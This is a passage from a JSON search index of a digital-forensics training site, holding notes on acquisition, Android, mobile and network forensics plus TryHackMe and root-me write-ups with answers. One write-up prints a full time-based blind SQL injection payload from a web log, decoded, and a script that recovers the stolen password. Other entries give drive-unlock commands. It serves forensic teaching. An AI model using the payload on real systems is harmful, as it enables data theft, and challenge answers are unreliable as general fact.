relevant for the specific case. The original evidence should only be used to create forensic copies or images. A write blocker (either in hardware or in software) is typically used to guarantee that no data is written to the original storage media. If a hardware write blocker is not available, software versions are available as standalone features in Caine, and as a part of some commercial and open source tools, such as EnCase and Autopsy. Choose a write blocker based on functionality, not just cost. Data imaging and hashing  Imaging is the exact copying of data either as a file, folder, partition, or entire storage media or drive....",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "ba0bc2cfb650900a23533ebced9099c4",
    "u": "https://dfir.tymyrddin.dev/docs/thm/ios",
    "t": "iOS forensics (SQLiteDB) ",
    "c": "iOS forensics (SQLiteDB)  Applying the fundamentals of iOS forensics for analysing an actual iPhone in “Operation JustEncase”: Your crime taskforce has been investigating into the root cause of a recent outbreak of criminal activity. Although you’ve apprehended a Mr Brandon Hunter, you need to analyse the filesystem dump of his iPhone to find a lead into the gang. Although the suspect’s phone is locked with a passcode, you have been able to use a recent “Lockdown Certificate” from the suspect’s computer, allowing you to create a logical file system dump from an iPhone backup he made recently . Open DB Browser (SQLite), click on open database option and select sms , then message : Who was the recipient of the SMS message sent on 23rd of August 2020? And what did the SMS message say? Looking at the address book, what is the first name of the other person in the contacts? And what is their listed “Organization”? Investigate their browsing history, what is the address of the website that they have bookmarked? The suspect received an email, what is the remote_id of the sender? What is the name of the company on one of the images stored on the suspects phone? What is the value of the cookie that was left behind?",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "33e5934a2c2b89e15a128ae35c680dc7",
    "u": "https://dfir.tymyrddin.dev/docs/notes/resources",
    "t": "Resources ",
    "c": "Resources  Challenges in digital forensics  F. Casino et al., Research Trends, Challenges, and Emerging Topics in Digital Forensics: A Review of Reviews in IEEE Access, vol. 10, pp. 25464-25493, 2022, doi: 10.1109/ACCESS.2022.3154059. Ahmed MohanRaj Alenezi, Digital and Cloud Forensic Challenges , Arxiv, 2023, doi: 10.48550/arXiv.2305.03059. Civil society response  Exodus Privacy Association de lutte contre les cyberviolences sexistes Pithus (beta) Mobile forensic & network analysis Rightscon 2021 - How To Respond To Advanced Digital Threats Against Civil Society Computer Incident Response Center for Civil Society Organisations  European Digital Forensic Lab (EDFL) CARICOM Cyber Security and Cybercrime Action Plan European Network of Forensic Science Institutes (ENFSI) Best practices  SWGDE Best Practices for Computer Forensic Acquisitions ACPO Good Practice Guide for Digital Evidence Technology advances  MicroTrend: Cybercrime & Digital Threats First response Reliability and accuracy of tools  Computer Forensics Tool Testing Program (CFTT) Computer Forensic Tool Testing (CFTT) Reports Artifacts  Forensic Artifacts Forensics Artifacts documentation National Software Reference Library (NSRL)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "92970396786d72dbb21b6651b12f2edb",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/c&c6",
    "t": "Command & Control level 6 ",
    "c": "Command & Control level 6  root-me challenge : Berthier, before blocking any of the malware’s traffic on our firewalls, we need to make sure we found all its C&C. This will let us know if there are other infected hosts on our network and be certain we’ve locked the attackers out. That’s it Berthier, we’re almost there, reverse this malware! The validation password is a fully qualified domain name : hote.domaine.tld . The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de . NB : This challenge requires the clearance of level 3 . Run the malware in a Windows VM and make an analysis of the traffic queries with WireShark. Or run it in an online sandbox. Or, analyse it with IDA or Ghidra.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "05d24ed20f3d1c580536be632c569302",
    "u": "https://dfir.tymyrddin.dev/docs/thm/leaky",
    "t": "Leaking private company data (again) (Autopsy) ",
    "c": "THM Rooms: Autopsy (1 and 2) Leaking private company data (again) (Autopsy)  What is the name of an Installed Program with the version number of 6.2.0.2962? Answer: Eraser A user has a Password Hint. What is the value? Answer: IAMAN Numerous SECRET files were accessed from a network drive. What was the IP address? Answer: 10.11.11.128 What web search term has the most entries? Answer: information leakage cases What was the web search conducted on 3/25/2015 21:46:44? Answer: anti-forensic tools What MD5 hash value of the binary is listed as an Interesting File? Answer: fe18b02e890f7a789c576be8abccdc99 What self-assuring message did the ‘Informant’ write for himself on a Sticky Note? (no spaces) Answer: Tomorrow... Everything will be OK... Using the Timeline, how many results were there on 2015-01-12? Answer: 46 The majority of file events occurred on what date? (MONTH DD, YYYY) Answer: March 25,2015 Resources  Autopsy User Documentation",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "c96926ebd417029703e53f36d9b28126",
    "u": "https://dfir.tymyrddin.dev/docs/notes/mobile-analysis",
    "t": "Mobile analysis ",
    "c": "Mobile analysis  Malicious applications are commonly delivered through different types of channel: a link in a phishing email a link in a chat group a link on a shady website on Google Play Store on alternative application stores Basic static analysis of samples  Static analysis can be done with various tools to decompile the binary, such as jadx , radare2 , rizin , and jeb . Tools such as droidlysis for automatic offline static analysis can also be used. Get the sample: In some cases, a sample will have to be retrieved from a potentially compromised device. For Android, you can try using mvt to download the APK file. If the application to be analysed is available on Google Play Store, try using apkeep to download it. Note that ADB usually runs with a non-privileged account. It will not provide access to internal application data. On a rooted phone, ADB will run as root and provide access to internal application data and OS files and folders. Perhaps BusyBox can be used. Store the sample, compute its SHA256 hash and only work on copies of the original file (to preserve its integrity). sha256sum sample.apk Identify the type of sample: The .apk file extension is an Android Package file used to distribute applications via Google Play Store (or FDroid). The .ipa file extension indicates an iPhone application archive file. It is usually encrypted with Apple’s FairPlay DRM technology, and compressed for the ARM architecture and can only be installed on an iPhone, iPod Touch, or iPad -> You may have to digitally sign the sample with your PGP key. Retrieve basic information: Use tools to extract information that will help you identify the binary and its potential origin ( jadx , androguard , Pithus (online) , and a sandbox ) The certificate can help distinguish between an original application and a potentially suspicious file. Search for it on the Google Play Store and compare the signing certificate fingerprints. Digital signatures of Android applications cannot be faked. Check if the sample was frosted by Google Play Store (Android only). Review the permissions requested and evaluate if they align with the legitimate purpose and functionality of the application. Related labs  Android malware analysis (Pithus and jadx) Resources  Esther Onfroy, Beginner guide - How to handle a potentially malicious mobile app , 2023, PTS Project",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a5f5d82cb7a14bcb36009c97fea30a81",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/log-web-attack",
    "t": "Log analysis web attack ",
    "c": "Log analysis web attack  root-me challenge : Our website appears to have been attacked, but our system administrator does not understand web server logs. Can you find out if any data has been stolen? First request: 192.168.1.23 - - [18/Jun/2015:12:12:54 +0200] \"GET /admin/?action=membres&order=QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk%3D HTTP/1.1\" 200 1005 \"-\" \"-\" Apache log, urldecode and base64decode: SELECT ( CASE FIELD ( concat( SUBSTRING( bin(ascii(SUBSTRING(password,1,1))), 1, 1 ), SUBSTRING( bin(ascii(SUBSTRING(password,1,1))), 2, 1 ) ), concat(CHAR(48),CHAR(48)), concat(CHAR(48),CHAR(49)), concat(CHAR(49),CHAR(48)), concat(CHAR(49),CHAR(49)) ) WHEN 1 THEN TRUE WHEN 2 THEN sleep(2) WHEN 3 THEN sleep(4) WHEN 4 THEN sleep(6) END ) FROM membres WHERE id=1 A blind sql injection attack, in which the attacker executes multiple queries separated by commas. ASC to display the list of members in order of largest to smallest, unrelated to the following query. From the select segment, the code to get the content of the password in the mebres table has id=1 ; with each character in the password field converted to integer, then to binary string. Each request in turn takes each 2 character bits of the binary string and finds its position in the field – field(xx,'00','01','10','11') , case field=1 returns true, and other values of field lead to sleep (different values). from datetime import datetime f = open ( \"ch13.txt\" , \"r\" ) timeList = [] char = '' flag = \"\" for line in f : timeList += [ line [ 30 : 38 ]] f . close () for i in range ( len ( timeList ) - 1 ): print ( datetime . strptime ( timeList [ i ], '%H:%M:%S' )) print ( datetime . strptime ( timeList [ i + 1 ], '%H:%M:%S' )) timeleft = datetime . strptime ( timeList [ i + 1 ], '%H:%M:%S' ) - datetime . strptime ( timeList [ i ], '%H:%M:%S' ) if i % 4 in [ 0 , 1 , 2 ]: if str ( timeleft ) == '0:00:00' : char += '00' if str ( timeleft ) == '0:00:02' : char += '01' if str ( timeleft ) == '0:00:04' : char += '10' if str ( timeleft ) == '0:00:06' : char += '11' if i % 4 == 3 : if str ( timeleft ) == '0:00:02' : char += '0' if str ( timeleft ) == '0:00:04' : char += '1' print ( char ) flag += chr ( int ( char , 2 )) char = '' print ( flag )",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0c7664764c9d4201dbd96bd669d9f6c0",
    "u": "https://dfir.tymyrddin.dev/docs/thm/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  TryHackMe challenges. Why?  Practicing. How?  A Windows server Organisation X desktop Standard Collector Analysis (Redline) IOC Search Collector (Redline) IOC Search Collector Analysis (Redline) Endpoint investigation (Redline) Leaking private company data (again) (Autopsy) Windows 10 disk image (Autopsy) Acceptable Use Policy violation (KAPE) BOB! THIS ISN’T A HORSE! (Volatility) That Kind of Hurt my Feelings (Volatility) Hunt for a nightmare (Volatility) Android malware analysis (Pithus and jadx) iOS forensics (SQLiteDB)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7e54ff1455c7dde29844013d6a7bcfc2",
    "u": "https://dfir.tymyrddin.dev/docs/thm/policy",
    "t": "Acceptable Use Policy violation (KAPE) ",
    "c": "THM Room: KAPE Acceptable Use Policy violation (KAPE)  Organisation X has an Acceptable Use Policy for their Portable Devices, including Laptops. This policy forbids users from connecting removable or Network drives, installing software from unknown locations, and connecting to unknown networks. It looks like one of the users has violated this policy. Can you help Organisation X find out if the user violated the Acceptable Use Policy on their device? Run KAPE with your desired Target and Module options. Hint: You can use EZviewer placed in the EZtools folder on Desktop to open CSV files. Answer the questions below Questions  Two USB Mass Storage devices were attached to this Virtual Machine. One had a Serial Number 0123456789ABCDE. What is the Serial Number of the other USB Device? Answer: 1C6F654E59A3B0C179D366AE 7zip, Google Chrome and Mozilla Firefox were installed from a Network drive location on the Virtual Machine. What was the drive letter and path of the directory from where these software were installed? Answer: Z:\\Setups What is the execution date and time of CHROME-SETUP.EXE in MM/DD/YYYY HH:MM? Answer: 11/25/2021 03:33 What search query was run on the system? Answer: RunWallpaperSetup.cmd When was the network named Network 3 First connected to? Answer: 11/30/2021 15:44 KAPE was copied from a removable drive. Can you find out what was the drive letter of the drive where KAPE was copied from? Answer: E:",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "3ad4e5bdaf748e63dad3c7da4962220c",
    "u": "https://dfir.tymyrddin.dev/docs/notes/preparation",
    "t": "Preparing for acquisition ",
    "c": "Preparing for acquisition  Assuming “dead” disk acquisition (drives and PCs already powered off): Understanding the host hardware configuration is useful for performance tuning, capacity planning, maintaining a stable platform, troubleshooting, isolating faults, and reducing the risk of human error. After physically attaching the subject drive to the examiner workstation (using a write-blocking mechanism), identify the block device associated with the subject drive: list the storage media devices, confirm any unique identifiers associated with the physical drive, and determine the corresponding device file in /dev . Query the drive for firmware and SMART information. If need be, remove HPA and DCO, and security built into the hardware of some drives. Image sizes and disk space requirements  Can the attached storage be analysed in place without taking a forensic image? What is the size of the subject disk? What is the available space on the examiner’s machine? What is the potential for image compression? How much space do forensic tools need for processing and temporary files? What is the estimated number of files to be extracted for further analysis? How much memory and swap space is available on the examiner’s machine? Is there a possibility of more subject disks being added to the same case or incident? Is there an expectation to separately extract all slack or unallocated disk space? Are there plans to extract individual partitions (possibly including swap)? Is there a potential need to convert from one forensic format to another? Do disk images need to be prepared for transport to another location? Do subject disks contain virtual machine images to separately extract and analyse? Do subject disks contain large numbers of compressed and archive files? Are subject disks using full-disk encryption? Is there a need to burn images to another disk or DVDs for storage or transport? Is there a need to carve files from a damaged or partially overwritten filesystem? How are backups of the examiner host performed? Hardware  For a quick overview of the host hardware: # lshw -businfo To specifically look for an attached device type: # lshw -businfo -class storage # lshw -businfo -class disk List all devices attached to the PCI bus: # lspci Lists all SATA mass storage controller (class ID 01, subclass ID 06) devices: # lspci -d ::0106 Enumerate all the SCSI, IDE, RAID, ATA, SATA, SAS, and NVME mass storage controller devices: # for i in 00 01 04 05 06 07 08; do lspci -d ::01$i; done List all devices with the USB serial bus controller class (class ID 0C, subclass ID 03): # lspci -d ::0C03 List all FireWire, USB, and Fibre Channel serial bus controllers: # for i in 00 03 04; do lspci -d ::0C$i; done If a drive is attached via USB, it will not appear on the PCI bus. List USB devices separately using lsusb : # lsusb -v Subject drive  Retrieve more information by specifying a disk’s vendor:productID : # lsusb -vd 0781:5583 lsscsi is useful for linking kernel device paths with device files in /dev : # lsscsi -v To determine which device was added at a known time: # dmesg -T Disk capabilities and features  The hdparm tool operates by sending requests to the OS disk drivers (using ioctls ) to retrieve information about the disk. From a forensics perspective, a number of items may be of interest or useful to document: Details about the drive geometry (physical and logical) The disk’s supported standards, features, and capabilities States and flags related to the drive configuration DCO and HPA information Security information Vendor information, such as make, model, and serial number The WWN device identifier (if it exists) Time needed for secure erase (for most disks, this is roughly the acquisition time) # hdparm -I /dev/sda The smartctl command is part of the smartmontools package and provides access to the SMART interface built into nearly all modern hard drives. The smartctl command queries attached ATA, SATA, SAS, and SCSI hardware. SMART provides a number of variables and statistics about a disk, some of which could be of interest to a forensic investigator: Statistics about errors on the disk and the overall health of the disk Number of times the disk was powered on Number of hours the disk was in operation Number of bytes read and written (often expressed in gigabytes) Various SMART logs (temperature history, …) # smartctl -x /dev/sda Hidden sectors  DCO  Detection: # hdparm -I /dev/sdl Query for the features modified by a DCO: # hdparm --dco-identify /dev/sdl Run hdparm to ensure the drive configuration is not locked or frozen: # hdparm -I /dev/sdl ... Security: ... not locked not frozen ... If frozen, hot plugging the drive power cable after booting could make the drive spin up in an unfrozen state. Running the hdparm command with the --dco-restore option: # hdparm --yes-i-know-what-i-am-doing --dco-restore /dev/sdl /dev/sdl: issuing DCO restore command Run hdparm -I /dev/sdl again and note the DCO hidden area’s exact sector offset, useful for extracting only the DCO sectors for separate analysis. The tableau-parm tool has an -r flag that should remove the DCO (and possibly the HPA) from the drive. HPA  Detection: # hdparm -N /dev/sdl /dev/sdl: max sectors = 879095852/976773168, HPA is enabled To (temporarily) temporarily remove the HPA: # hdparm --yes-i-know-what-i-am-doing -N 976773168 /dev/sdl For permanent removal: # hdparm --yes-i-know-what-i-am-doing -N p976773168 /dev/sdl As with DCO, note the HPA hidden area’s exact sector offset, useful for extracting only the HPA sectors for separate analysis. System area  Access to the system area (service area, negative sectors, or maintenance sectors) is done through proprietary vendor commands, which are usually not public. In some cases, it is possible to bypass the standard SATA, USB, or SAS interfaces and access storage media using debug or diagnostic ports built into the drive electronics. Media access in this manner is not standard across manufacturers or even across drives from the same manufacturer. Some commercial tools exist (see ACELab PC-3000 and Atola Insight Forensic). Security features  Passwords  The Security output from hdparm will indicate if a drive is frozen. Many USB bridges automatically spin up an attached disk in an unfrozen state, but if a problem persists, try: Checking the BIOS for settings to enable/disable the freeze command Use a forensic boot CD that prevents freeze commands from being issued Attach the disk to a separate controller card (not built into the mainboard) Hot plug the disk into the system (if supported) Use a mainboard that does not issue freeze commands If the user password is known and the drive security is not frozen, unlock the drive with: # hdparm --security-unlock \"user password\" /dev/sdb If the master password is known and the security level is set to high , use the master password to unlock the drive with: # hdparm --user-master m --security-unlock \"master password\" /dev/sdb If no passwords are known, access to the disk is not possible with regular tools. The password information is stored on the service/system areas of a disk and is generally not accessible without special hardware or tools. But … The master password might be set to a factory default and can be used to gain access to the drive (if the security level is set to high and not maximum). Using brute force is not efficient, because the drive must be reset after five failed attempts, but with a small set of likely passwords, worth a try. It may be that passwords are hidden or stored in an accessible location. Passwords may have been reused across different accounts or devices. The password may be volunteered by the owner (like the victim) or a cooperating accomplice. A person may be legally compelled to provide passwords. Key escrow or backups may provide passwords. Specialized data recovery companies provide services and hardware tools that can recover or reset ATA Security Feature Set...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "f8db157d99acad074108da6cd1bc6666",
    "u": "https://dfir.tymyrddin.dev/docs/thm/server",
    "t": "A Windows server ",
    "c": "THM Room: Windows Forensics A Windows server  What is the version and year of the Windows machine? Answer: Windows Server 2016 Which user logged in last? Answer: Administrator When did John log onto the system last? Answer format: MM/DD/YYYY H:MM:SS AM/PM Answer: 03/02/2019 5:48:32 PM What IP does the system connect to when it first starts? Answer: 10.34.2.3 What two accounts had administrative privileges (other than the Administrator user)? Answer format: username1, username2 Answer: Jenny,Guest What is the name of the scheduled task that is malicious. Answer: Clean file system What file was the task trying to run daily? Answer: nc.ps1 What port did this file listen locally for? Answer: 1348 When did Jenny last logon? Answer: Never At what date did the compromise take place? Answer format: MM/DD/YYYY Answer: 03/02/2019 At what time did Windows first assign special privileges to a new logon? Answer format: MM/DD/YYYY HH:MM:SS AM/PM Filter in Windows Security logs in a time frame and event 4672 Then find the event using the hint: 00/00/0000 0:00:49 PM Answer: 03/02/2019 04:04:49 PM What tool was used to get Windows passwords? Answer: Mimikatz What was the attackers external control and command servers IP? Answer: 76.32.97.132 What was the extension name of the shell uploaded via the servers’ website? Answer: .jsp What was the last port the attacker opened? Answer: 1337 Check for DNS poisoning, what site was targeted? Answer: google.com",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8156e0be6b8defa894de7121155d1972",
    "u": "https://dfir.tymyrddin.dev/docs/notes/android",
    "t": "Android analysis ",
    "c": "Android analysis  Filesystem hierarchy  The file hierarchy in Android resembles a Linux file system hierarchy , but based on the device manufacturer and the underlying Linux version, it may have a few insignificant changes. The /boot partition has the information and files required for the phone to boot. It contains the kernel and RAM disk. Data residing in RAM is rich in value and can be captured during a forensic acquisition. The /system partition contains system-related files other than the kernel and RAM disk. Never delete. /recovery is designed for backup purposes and allows the device to boot into recovery mode. The /data contains the data of each application. Most of the data belonging to the user, such as the contacts, SMS, and dialed numbers, is stored in this folder. /cache is used to store the frequently accessed data and some logs for faster retrieval. The data residing here may no longer be present in the /data partition. /misc contains information about miscellaneous settings. These settings mostly define the state of the device (on/off), hardware settings, USB settings, etc. The /sdcard partition tholds all the information present on the SD card. It is valuable as it can contain information such as pictures, videos, files, documents, and so on. Filesystem  The file systems supported by the Android kernel can be determined by checking the contents of the filesystems file in the proc folder: root@android:/ # cat /proc/filesystems The mount command displays different partitions available on the device: root@android:/ # mount The root file system ( rootfs ) is one of the main components of Android and contains all the information required to boot the device. When the device starts the boot process, it needs access to many core files, and thus, it mounts the root file system. This file system is mounted at / (root folder), and is the file system on which all the other file systems are slowly mounted. If this file system is corrupt, the device cannot be booted. The sysfs file system mounts the /sys folder, which contains information about the configuration of the device: root@android:/ # cd /sys root@android:/sys # ls The data present in these folders is mostly related to configuration, and not usually of much significance to a forensic investigator, unless it is necessary to check whether a particular setting was enabled on the phone. The devpts file system presents an interface to the Terminal session on an Android device. It is mounted at /dev/pts . Whenever a Terminal connection is established, for instance, when an adb shell is connected to an Android device, a new node is created under /dev/pts . The cgroup file system stands for control groups. Android devices use this file system to track their jobs. They are responsible for aggregating the tasks and keeping track of them. This data is generally not very useful during forensic analysis. The proc file system contains information about kernel data structures, processes, and other system-related information under the /proc directory. For example, /proc/filesystems displays the list of available file systems on the device. root@android:/ # cat /proc/cpuinfo The tmpfs file system is a temporary storage on the device that stores the files in RAM (volatile memory). The main advantage of using RAM is faster access and retrieval. But, once the device is restarted or switched off, this data will not be accessible anymore. Hence, it’s important to examine the data in RAM before a device reboot happens, or to extract the data via RAM acquisition methods. File system types  Yet Another Flash File System 2 (YAFFS2) is an open source, single-threaded file system released in 2002. It is mainly designed to be fast when dealing with the NAND flash. YAFFS2 utilizes out of band (OOB), and this is often not captured or decoded correctly during forensic acquisition, which makes analysis difficult. In 2010, there was an announcement stating that in releases after Gingerbread, devices were going to move from YAFFS2 to EXT4. The EXT4 file system, the fourth extended file system, has gained significance with mobile devices implementing dual-core processors. VFAT is an extension to the FAT16 and FAT32 file systems. Microsoft’s FAT32 file system is supported by most Android devices. It is supported by almost all the major operating systems, including Windows, Linux, and macOS. This enables these systems to easily read, modify, and delete the files present on the FAT32 portion of the Android device. Most of the external SD cards are formatted using the FAT32 file system. Flash Friendly File System (F2FS) was released in February 2013 to support Samsung devices running the Linux 3.8 kernel. F2FS relies on log-structured methods that optimize the NAND flash memory (supporting offline support features). Robust File System (RFS) supports NAND flash memory on Samsung devices. RFS can be summarized as a FAT16 (or FAT32) file system where journaling is enabled through a transaction log. Application data storage  Android devices store a lot of sensitive data through the use of apps installed by the manufacturer, that come along with Android, wireless, and apps installed by the user from various sources. These store different types of data on the device, which contain information that may be relevant to an investigation. Data belonging to applications can be stored internally or externally. In the case of external storage (SD card), data can be stored anywhere. In the case of internal storage, the location is in the /data/data subdirectory. For example, the default Android email app has a package named com.android.email , and the internal data is stored in /data/data/com.android.email . Shared Preferences provides a framework to store key-value pairs of primitive data types in the .xml format. Primitive data types include Boolean, float, int, long, and string. Strings are stored in the Universal Character Set Transformation Format-8 (UTF-8) format. These files are stored in the application’s /data/data/<package_name>/shared_prefs path. The files stored in the internal storage are located in the application’s /data/data subdirectory. This data is private and cannot be accessed by other applications. Even the device owner is prevented from accessing the files (except root ). External storage can be any removable media. In the case of a removable SD card, data can be used on other devices just by removing the SD card and inserting it into any other device. SD cards are usually formatted with the FAT32 filesystem, but other filesystems, such as EXT3 and EXT4, can also be used. This data is public and can be accessed by other applications, if the requesting app has the necessary permissions. Large files, such as images and videos, loaded by an app are often stored in external storage for faster retrieval. SQLite is a popular database format present in many mobile systems, and a source of forensic data. The SQLite files used by the apps are stored at /data/data/<ApplicationPackageName>/databases . The network can also be used to store and retrieve data on a user’s web-based services. To do network operations, the classes in the java.net.* and android.net.* packages are used to provide developers with the low-level APIs that are necessary to interact with the network, web servers, etc. Analysing an image using Autopsy  Open the Autopsy tool and select the Create New Case option. Enter all the necessary case details, including the name of the case, the location where data needs to be stored, … and click Next . Enter a case number and researcher details, and click on Finish . Click on the Add Data Source button, add the image file to be analysed, set the correct time zone and click on Next . Choose the modules you want to run on the image: Android Analyzer , Exif Parser , Keyword Search , PhotoRec Carver , and Recent Activity at minimum. Maybe also the Extension Mismatch Detector . Click on Next . It takes a few minutes...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "157e95ead05e1ee383a33a40b9f56468",
    "u": "https://dfir.tymyrddin.dev/docs/notes/network",
    "t": "Network forensics ",
    "c": "Network forensics  Network forensics is a specific subdomain of the Forensics domain, and it focuses on network traffic investigation. Network forensics discipline covers the work done to access information transmitted by listening and investigating live and recorded traffic, gathering evidence/artefacts and understanding potential problems. IOW, it is the action of recording packets of network traffic and creating investigatable sources and establishing a root–cause analysis of an event. The ultimate goal is to provide sufficient information to detect malicious activities, security breaches, policy/regulation compliance, system health and user behaviour. The investigation process identifies communicated hosts in terms of time, frequency, protocol, application and data. An investigation tries to answer the 5W ; Who (Source IP and port) What (Data/payload) Where (Destination IP and port) When (Time and data) Why (How/What happened) Note that the network evidence capture and investigation process is meant to be systematic. Having enough data and the right timeline capture for a successful network forensics investigation is crucial. Primary purposes of network forensics  Security Operations (SOC): Daily security monitoring activities on system performance and health, user behaviour, and security issues. Incident Handling/Response and Threat Hunting: During/Post-incident investigation activities on understanding the reason for the incident, detecting malicious and suspicious activity, and investigating the data flow content. Traffic investigation actions fall under Network forensics, and also under NTA . For example, NetworkMiner, used in network forensics and NTA, is capable of processing and handling packet pictures and live traffic. Both live and captured traffic data sources are valuable for forensics investigations, but the main purpose of using NetworkMiner is to investigate the overall flow/condition of a limited amount of traffic, not for a long in-depth live traffic investigation. Network forensics use cases  Network discovery: Discovering the network to overview connected devices, rogue hosts and network load. Packets reassembling: Reassembling the packets to investigate the traffic flow. This use case is helpful in unencrypted traffic flows. Data leakage detection: Reviewing packet transfer rates for each host and destination address helps detect possible data leakage. Anomaly and malicious activity detection: Reviewing overall network load by focusing on used ports, source and destination addresses, and data helps detect possible malicious activities along with vulnerabilities. This use case covers the correlation of indicators and hypotheses as well. Policy/Regulation compliance control: Reviewing overall network behaviour helps detect policy/regulation compliance. Advantages of network forensics  Availability of network-based evidence in the wild: Capturing network traffic is collecting evidence, so it is easier than other types of evidence collections such as logs and IOCs. Ease of data/evidence collection without creating noise: Capturing and working with network traffic is easier than investigating unfiltered events by EDRs, EPPs and log systems. Usually, sniffing doesn’t create much noise, logs and alerts. The other thing is that network traffic is not destructible like logs and alerts generated by security systems. It is hard to destroy the network evidence, as it is the transferred data: Since the evidence is the traffic itself, it is impossible to do anything without creating network noise. Still, it is possible to hide the artefacts by encrypting, tunnelling and manipulating the packets. So, the second fact is the challenge of this advantage. Availability of log sources: Logs provide valuable information which helps to correlate the chain of events and support the investigation hypothesis. The majority of the EDRs, EPPs and network devices create logs by default. Having log files is easy if the attacker/threat/malware didn’t erase/destroy them. It is possible to gather evidence for memory and non-residential malicious activities: The malware/threat might reside in the memory to avoid detection. However, the series of commands and connections live in the network. So it is possible to detect non-residential threats with Network forensics tools and tactics. Challenges of network forensics  Deciding what to do: One of the most difficult challenges of Network forensics is “Deciding what to do”. There are several purposes of carving networks; SOC, IH/IR and Threat Hunting. Observing, trapping, catching, or stopping an anomalous activity is also possible. Sufficient data/evidence collection on the network: One of the advantages of Network forensics is “Ease of collecting evidence”. However, the breadth of this concept poses a challenge. There are multiple points to consider in data/evidence collection. Short data capture: One of the challenges in data/evidence collection. Capturing all network activity is not applicable and operable. So, it is hard always to have the packet captures that covers pre, during and post-event. The unavailability of full-packet capture on suspicious events: Continuously capturing, storing and processing full-packets costs time and resources. The inability to have full-packet captures for a long time creates time gaps between captures, resulting in missing a significant part of an event of interest. Sometimes NetFlow captures are used instead of full-packet captures to reduce the weight of having full-packet captures and increase the capture time. Note that full-packet captures provide full packet details and give the opportunity of event reconstruction, while NetFlow provides high-level summary but not data/payload details. Encrypted traffic: Encrypted data is another challenge of Network forensics. In most cases, discovering the contents of the encrypted data is not possible. However, the encrypted data still can provide valuable information for the hypothesis like source and destination address and used services. GDPR and Privacy concerns in traffic recording: Capturing the traffic is the same as “recording everything on the wire”; therefore, this act should comply with GDPR and business-specific regulations (e.g. HIPAA, PCI DSS and FISMA ). Nonstandard port usage: One of the popular approaches in Network forensics investigations is grabbing the low-hanging fruits in the first investigation step. Looking for commonly used patterns (like known ports and services used in enumeration and exploitation) is known as grabbing the low-hanging fruits. However, sometimes attackers/threats use nonstandard ports and services to avoid detection and bypass security mechanisms. Therefor sometimes, this ends up as a challenge of Network forensics. Time zone issues: Using a common time zone is important for big-scale event investigation. Especially when working with multiple resources over different time zones, usage of different time zones create difficulties in event correlation. Lack of logs: Network forensics is not limited to investigating the network traffic data. Network devices and event logs are crucial in event correlation and investigation hypotheses. This fact is known by the attackers/threats as well; therefore these logs are often erased by them, in order to make the investigation more difficult. Investigated data types in network forensics  Live Traffic Traffic Captures (full packet captures and network flows) Log Files Sources of evidence  Capturing proper network traffic requires knowledge and tools. Usually, there is a single chance of gathering the live traffic as evidence. There are multiple evidence resources to gather Network forensics data: TAPS InLine Devices SPAN Ports Hubs Switches Routers DHCP Servers Name Servers Authentication Servers Firewalls Web Proxies Central Log Servers Logs (IDS/IPS, Application, OS, Device)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "98060f8456c237712d25de0729191511",
    "u": "https://nta.tymyrddin.dev/",
    "t": "Network traffic analysis (NTA) ",
    "c": "Network traffic analysis (NTA)  Spot and probe network anomalies using industry tools and techniques. Testlab Network traffic analysis tools TryHackMe rooms  Wireshark Introduction Nmap scans ARP poisoning & on-path Identifying hosts Tunneling traffic Clear-text protocol analysis Encrypted protocol analysis Hunt clear-text credentials Firewall rules Snort Introduction Writing IDS rules MS17-010 Log4j Brute force Reverse shell Zeek Introduction Network security monitoring Signatures Scripts Scripts and signatures Frameworks Packages Anomalous DNS Phishing Log4J Brim Introduction Use cases Malware C2 detection Crypto mining Root-me challenges Introduction FTP authentication TELNET authentication ETHERNET frame Twitter authentication Bluetooth Unknown file CISCO password DNS zone transfer IP Time To Live LDAP null bind POP-APOP SIP - authentication ETHERNET patched transmission Global system traffic for mobile communication SSL HTTP exchange Books ",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "83fa0b7fc3acbcefd9d85a0ad1ff4b17",
    "u": "https://nta.tymyrddin.dev/docs/root-me/ethernet-patched",
    "t": "ETHERNET patched transmission ",
